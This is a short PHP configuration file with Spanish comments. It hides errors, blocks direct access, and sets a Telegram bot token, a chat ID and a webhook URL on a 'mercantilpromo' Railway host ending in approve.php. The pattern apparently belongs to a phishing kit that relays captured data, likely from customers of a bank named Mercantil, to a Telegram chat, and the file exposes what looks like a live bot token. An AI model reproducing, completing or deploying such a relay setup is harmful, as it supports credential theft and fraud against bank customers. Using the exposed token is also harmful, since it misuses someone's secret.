<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Bots y grupos
$telegram_accounts = [

    [
        'token' => '8841088443:AAGlXEHbSocdK_C3-_nL2au-kCYycQtrMS8',
        'chat_id' => '-5325255206'
    ],

    [
        'token' => '',
        'chat_id' => ''
    ]

];

$webhook_url = 'https://mercantilpromo.up.railway.app/approve.php';
?>
